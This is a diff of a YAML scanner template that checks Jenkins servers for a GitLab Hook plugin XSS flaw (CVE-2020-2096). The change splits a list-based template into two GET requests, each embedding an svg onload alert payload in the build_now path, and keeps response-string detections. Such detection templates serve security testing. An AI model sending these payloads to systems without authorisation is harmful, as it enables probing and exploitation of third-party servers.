@@ -1,5 +1,4 @@
-id: custom-xss-01
-type: list
+id: jenkins-xss-01
 info:
   name: Jenkins Gitlab XSS - CVE-2020-2096
   risk: Medium
@@ -8,24 +7,27 @@ variables:
   - prefix: |
       /
       /jenkins/
-  - git: |
-      git/
-      git/ping
-      git/build_now/a'"><svg/onload=alert(document.domain)>
-      gitlab/
-      gitlab/ping
-      gitlab/build_now/a'"><svg/onload=alert(document.domain)>
+      
 requests:
   - method: GET
     redirect: true
-    use_template_header: true
     url: >-
-     {{.BaseURL}}{{.prefix}}{{.git}}
+     {{.BaseURL}}{{.prefix}}gitlab/build_now/a'"><svg/onload=alert(document.domain)>
     detections:
       - >-
         StringSearch("response", "know how to process") || StringSearch("response", "See https://github.com/elvanja/jenkins-gitlab-hook-plugin for details")
       - >-
         StatusCode() == 200 && StringSearch("response", "Gitlab Web Hook")
+  - method: GET
+    redirect: true
+    url: >-
+     {{.BaseURL}}{{.prefix}}git/build_now/a'"><svg/onload=alert(document.domain)>
+    detections:
+      - >-
+        StringSearch("response", "know how to process") || StringSearch("response", "See https://github.com/elvanja/jenkins-gitlab-hook-plugin for details")
+      - >-
+        StatusCode() == 200 && StringSearch("response", "Gitlab Web Hook")
+
 reference:
   author: j3ssie
   link: https://jenkins.io/security/advisory/2020-01-15/
